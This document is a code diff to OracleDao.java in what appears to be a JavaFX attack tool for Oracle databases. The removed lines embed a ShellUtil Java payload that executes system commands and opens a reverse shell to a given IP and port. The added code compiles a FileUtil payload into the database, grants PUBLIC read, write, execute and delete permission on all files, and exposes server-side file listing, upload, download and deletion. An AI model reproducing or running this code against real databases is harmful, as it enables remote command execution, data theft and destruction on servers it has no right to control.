@@ -3,17 +3,23 @@ package Dao;
 import Controller.OracleController;
 import Entity.ControllersFactory;
 import Util.MessageUtil;
+import Util.OracleCodeUtils;
 import Util.Utils;
 import Util.YamlConfigs;
 import javafx.application.Platform;
 
+import java.io.File;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.sql.*;
 import java.text.MessageFormat;
+import java.util.ArrayList;
 import java.util.Locale;
 import java.util.Map;
+
+import static Util.Utils.splitDisk;
+import static Util.Utils.splitFiles;
 
 
 /**
@@ -31,112 +37,6 @@ public class OracleDao {
     private Method METHOD;
     private String OS = "linux";
 
-    private static String SHELLUTILSOURCE = "import java.io.*;\n" +
-            "import java.net.Socket;\n" +
-            "\n" +
-            "public class ShellUtil extends Object{\n" +
-            "    public static String run(String methodName, String params, String encoding) {\n" +
-            "        String res = \"\";\n" +
-            "        if (methodName.equals(\"exec\")) {\n" +
-            "            res = ShellUtil.exec(params, encoding);\n" +
-            "        }else if (methodName.equals(\"connectback\")) {\n" +
-            "            String ip = params.substring(0, params.indexOf(\"^\"));\n" +
-            "            String port = params.substring(params.indexOf(\"^\") + 1);\n" +
-            "            res = ShellUtil.connectBack(ip, Integer.parseInt(port));\n" +
-            "        }\n" +
-            "        else {\n" +
-            "            res = \"unkown methodName\";\n" +
-            "        }\n" +
-            "        return res;\n" +
-            "    }\n" +
-            "    public static String exec(String command,String encoding) {\n" +
-            "        StringBuffer result = new StringBuffer();\n" +
-            "        BufferedReader br = null;\n" +
-            "        InputStreamReader isr = null;\n" +
-            "        InputStream fis = null;\n" +
-            "        Process p = null;\n" +
-            "        if (encoding == null || encoding.equals(\"\")) {\n" +
-            "            encoding = \"utf-8\";\n" +
-            "        }\n" +
-            "        try {\n" +
-            "            p = Runtime.getRuntime().exec(command);\n" +
-            "            p.waitFor();\n" +
-            "            if (p.exitValue() == 0) {\n" +
-            "                fis = p.getInputStream();\n" +
-            "            } else {\n" +
-            "                fis = p.getErrorStream();\n" +
-            "            }\n" +
-            "            isr = new InputStreamReader(fis,encoding);\n" +
-            "            br = new BufferedReader(isr);\n" +
-            "            String line = null;\n" +
-            "            while ((line = br.readLine()) != null) {\n" +
-            "                result.append(line + \"\\n\");\n" +
-            "            }\n" +
-            "        } catch (Exception e) {\n" +
-            "            result.append(e.getMessage());\n" +
-            "        }finally {\n" +
-            "            try {\n" +
-            "                br.close();\n" +
-            "                isr.close();\n" +
-            "                p.destroy();\n" +
-            "            } catch (IOException e) {\n" +
-            "                result.append(e.getMessage());\n" +
-            "            }\n" +
-            "        }\n" +
-            "        return result.toString();\n" +
-            "    }\n" +
-            "\n" +
-            "    public static String connectBack(String ip, int port) {\n" +
-            "        class StreamConnector extends Thread {\n" +
-            "            InputStream sp;\n" +
-            "            OutputStream gh;\n" +
-            "\n" +
-            "            StreamConnector(InputStream sp, OutputStream gh) {\n" +
-            "                this.sp = sp;\n" +
-            "                this.gh = gh;\n" +
-            "            }\n" +
-            "            @Override\n" +
-            "            public void run() {\n" +
-            "                BufferedReader xp = null;\n" +
-            "                BufferedWriter ydg = null;\n" +
-            "                try {\n" +
-            "                    xp = new BufferedReader(new InputStreamReader(this.sp));\n" +
-            "                    ydg = new BufferedWriter(new OutputStreamWriter(this.gh));\n" +
-            "                    char buffer[] = new char[8192];\n" +
-            "                    int length;\n" +
-            "                    while ((length = xp.read(buffer, 0, buffer.length)) > 0) {\n" +
-            "                        ydg.write(buffer, 0, length);\n" +
-            "                        ydg.flush();\n" +
-            "                    }\n" +
-            "                } catch (Exception e) {}\n" +
-            "                try {\n" +
-            "                    if (xp != null) {\n" +
-            "                        xp.close();\n" +
-            "                    }\n" +
-            "                    if (ydg != null) {\n" +
-            "                        ydg.close();\n" +
-            "                    }\n" +
-            "                } catch (Exception e) {\n" +
-            "                }\n" +
-            "            }\n" +
-            "        }\n" +
-            "        try {\n" +
-            "            String sp;\n" +
-            "            if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\n" +
-            "                sp = new String(\"/bin/sh\");\n" +
-            "            } else {\n" +
-            "                sp = new String(\"cmd.exe\");\n" +
-            "            }\n" +
-            "            Socket sk = new Socket(ip, port);\n" +
-            "            Process ps = Runtime.getRuntime().exec(sp);\n" +
-            "            (new StreamConnector(ps.getInputStream(), sk.getOutputStream())).start();\n" +
-            "            (new StreamConnector(sk.getInputStream(), ps.getOutputStream())).start();\n" +
-            "        } catch (Exception e) {\n" +
-            "        }\n" +
-            "        return \"^OK^\";\n" +
-            "    }\n" +
-            "}";
-
 
     /**
      * 用此方法获取 OracleController 的日志框
@@ -144,7 +44,6 @@ public class OracleDao {
     private OracleController oracleController = (OracleController) ControllersFactory.controllers.get(OracleController.class.getSimpleName());
 
     public OracleDao(String ip,String port,String database,String username,String password,String timeout) throws Exception {
-        String tempFileString = "file://";
         YamlConfigs configs = new YamlConfigs();
         Map<String, Object> yamlToMap = configs.getYamlToMap("config.yaml");
         // 从配置文件读取变量
@@ -162,11 +61,9 @@ public class OracleDao {
         URLCLASSLOADER = (URLClassLoader) ClassLoader.getSystemClassLoader();
         METHOD = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
         METHOD.setAccessible(true);
-        //判断是否是 windows 是的话需要多加一个斜杠
-        if(System.getProperty("os.name").toLowerCase().contains("windows")){
-            tempFileString = "file:///";
-        }
-        METHOD.invoke(URLCLASSLOADER, new URL(tempFileString + JARFILE));
+        // 将路径转为 url 类型进行加载，修复系统路径不兼容问题
+        URL url = (new File(JARFILE)).toURI().toURL();
+        METHOD.invoke(URLCLASSLOADER, url);
         Class.forName(DRIVER);
 
     }
@@ -384,14 +281,14 @@ public class OracleDao {
     }
 
     /**
-     * 初始化 JAVA 代码
+     * 初始化 ShellUtilJAVA 代码
      */
-    public void importJAVA(){
+    public void importShellUtilJAVA(){
         try {
             String CREATE_SOURCE = "DECLARE v_command VARCHAR2(32767);BEGIN v_command :='create or replace and compile java source named \"ShellUtil\" as %s';EXECUTE IMMEDIATE v_command;END;";
             String GRANT_JAVA_EXEC = "begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;";
             String CREATE_FUNCTION = "create or replace function shellrun(methodName varchar2,params varchar2,encoding varchar2) return varchar2 as language java name 'ShellUtil.run(java.lang.String,java.lang.String,java.lang.String) return java.lang.String';";
-            CREATE_SOURCE = String.format(CREATE_SOURCE,SHELLUTILSOURCE);
+            CREATE_SOURCE = String.format(CREATE_SOURCE, OracleCodeUtils.SHELLUTILSOURCE);
             executeSql(CREATE_SOURCE);
             oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码成功！"));
             executeSql(GRANT_JAVA_EXEC);
@@ -404,6 +301,31 @@ public class OracleDao {
             });
         }
     }
+
+    /**
+     * 初始化 FileUtilJAVA 代码
+     */
+    public void importFileUtilJAVA(){
+        try {
+            String CREATE_SOURCE = "DECLARE v_command VARCHAR2(32767);BEGIN v_command :='create or replace and compile java source named \"FileUtil\" as %s';EXECUTE IMMEDIATE v_command;END;";
+            String GRANT_JAVA_EXEC = "begin dbms_java.grant_permission( 'PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete' );end;";
+            String CREATE_FUNCTION = "create or replace function filerun(methodName varchar2,params varchar2,encoding" +
+                    " varchar2) return varchar2 as language java name 'FileUtil.run(java.lang.String,java.lang.String,java.lang.String) return java.lang.String';";
+            CREATE_SOURCE = String.format(CREATE_SOURCE, OracleCodeUtils.FILEUTILSOURCE);
+            executeSql(CREATE_SOURCE);
+            oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码成功！"));
+            executeSql(GRANT_JAVA_EXEC);
+            oracleController.oracleLogTextArea.appendText(Utils.log("赋权成功！"));
+            executeSql(CREATE_FUNCTION);
+            oracleController.oracleLogTextArea.appendText(Utils.log("创建 FileRun 函数成功！"));
+        }catch (Exception e){
+            Platform.runLater(() ->{
+                MessageUtil.showExceptionMessage(e,e.getMessage());
+            });
+        }
+    }
+
+
 
     /**
      * 执行系统命令
@@ -445,7 +367,7 @@ public class OracleDao {
     /**
      * 删除 ShellUtil 函数
      */
-    public void deleteFunction(){
+    public void deleteShellFunction(){
         String res = "";
         try {
             String checkSql = "select object_name from all_objects where object_name like '%SHELLRUN'";
@@ -459,6 +381,31 @@ public class OracleDao {
                 oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数成功！"));
             }else {
                 oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数失败！"));
+            }
+        }catch (Exception e){
+            Platform.runLater(() ->{
+                MessageUtil.showExceptionMessage(e,e.getMessage());
+            });
+        }
+    }
+
+    /**
+     * 删除 FileUtil 函数
+     */
+    public void deleteFileFunction(){
+        String res = "";
+        try {
+            String checkSql = "select object_name from all_objects where object_name like '%FILERUN'";
+            String dropJAVASql = "DROP JAVA SOURCE \"FileUtil\"";
+            String dropFuncSql = "drop function FILERUN";
+            res = executeSql(checkSql).replace("\n","");
+            // 不等于空就说明存在 shellrun 函数
+            if(!"".equals(res)){
+                executeSql(dropFuncSql);
+                executeSql(dropJAVASql);
+                oracleController.oracleLogTextArea.appendText(Utils.log("删除 FILERUN 函数成功！"));
+            }else {
+                oracleController.oracleLogTextArea.appendText(Utils.log("删除 FILERUN 函数失败！"));
             }
         }catch (Exception e){
             Platform.runLater(() ->{
@@ -488,4 +435,114 @@ public class OracleDao {
             });
         }
     }
+
+
+    /**
+     * 获取所有盘符
+     * @return
+     */
+    public ArrayList<String> getDisk(){
+        String tempres = "";
+        ArrayList<String> res = new ArrayList<String>();
+        String sql = "select filerun('listdiver','','') from dual";
+        try {
+            tempres = executeSql(sql);
+            res = splitDisk(tempres);
+        } catch (Exception e) {
+            Platform.runLater(() ->{
+                MessageUtil.showExceptionMessage(e,e.getMessage());
+            });
+        }
+        return res;
+    }
+
+
+    /**
+     * 获取路径下所有的文件夹和文件名
+     * @param path
+     * @param code
+     * @return
+     */
+    public ArrayList<String> getFiles(String path,String code){
+        ArrayList<String> res = new ArrayList<String>();
+        if (code == null || code.equals("")) {
+            code = "UTF-8";
+        }
+        String tempres = "";
+        String sql = String.format("select filerun('listfile','%s','%s') from dual",path,code);
+        try {
+            tempres = executeSql(sql);
+            res = splitFiles(tempres);
+        } catch (Exception e) {
+            Platform.runLater(() ->{
+                MessageUtil.showExceptionMessage(e,e.getMessage());
+            });
+        }
+        return res;
+    }
+
+    /**
+     * 上传文件
+     * @param path
+     * @param contexts
+     */
+    public void upload(String path,String contexts){
+        String sql = "select filerun('writefile','%s^%s','') from dual";
+        try {
+            sql = String.format(sql,path,contexts);
+            String res = executeSql(sql);
+            if("ok".equals(res)){
+                oracleController.oracleLogTextArea.appendText(Utils.log("上传文件成功！"));
+
+            }else {
+                oracleController.oracleLogTextArea.appendText(Utils.log("上传文件失败！"));
+            }
+            //PublicUtil.log("上传文件成功！");
+        } catch (Exception e) {
+            Platform.runLater(() ->{
+                MessageUtil.showExceptionMessage(e,e.getMessage());
+            });
+            //PublicUtil.log(throwables.getMessage());
+        }
+    }
+
+    /**
+     * 下载文件
+     * @param path
+     * @return
+     */
+    public String download(String path){
+        String sql = "select filerun('readfile','%s','') from dual";
+        String res = "";
+        try {
+            sql = String.format(sql,path);
+            res = executeSql(sql);
+        }catch (Exception e){
+            Platform.runLater(() ->{
+                MessageUtil.showExceptionMessage(e,e.getMessage());
+            });
+        }
+        return res;
+    }
+
+    /**
+     * 删除文件
+     * @param path
+     * @return
+     */
+    public String delete(String path){
+        String sql = "select filerun('deletefile','%s','') from dual";
+        String res = "";
+        try {
+            sql = String.format(sql,path);
+            res = executeSql(sql);
+        }catch (Exception e){
+            Platform.runLater(() ->{
+                MessageUtil.showExceptionMessage(e,e.getMessage());
+            });
+        }
+        return res;
+    }
+
+
 }
